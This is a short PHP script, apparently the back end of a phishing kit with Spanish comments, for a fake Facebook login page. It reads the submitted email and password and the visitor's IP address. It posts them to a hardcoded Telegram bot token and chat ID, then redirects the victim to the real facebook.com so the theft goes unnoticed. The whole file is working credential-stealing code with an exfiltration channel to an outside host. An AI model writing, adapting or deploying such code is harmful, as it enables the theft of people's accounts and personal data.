<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Los nombres deben coincidir con los del HTML: 'correo' y 'clave'
    $usuario = isset($_POST['correo']) ? trim($_POST['correo']) : '';
    $contrasena = isset($_POST['clave']) ? trim($_POST['clave']) : '';

    if (empty($usuario) || empty($contrasena)) {
        echo "Por favor, completa todos los campos.";
        exit;
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    
    $telegramBotToken = "6487834869:AAFB88ijM5qccSRqKD7ygcq3v7kG-kc8oF8";
    $chatId = "6193508268";

    $message = "🔐 *Datos   De Ingreso Facebook*\n"
             . "👤 Usuario: $usuario\n"
             . "🔑 Contraseña: $contrasena\n"
             . "🌐 IP: $ip";

    $telegramUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        "http" => [
            "header" => "Content-type: application/x-www-form-urlencoded\r\n",
            "method"  => "POST",
            "content" => http_build_query($data),
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($telegramUrl, false, $context);

    if ($result === FALSE) {
        echo "❌ Error al enviar datos a Telegram. Revisa el token o el ID del chat.";
    } else {
        header("Location: https://www.facebook.com/");
        exit();
    }
}
?>
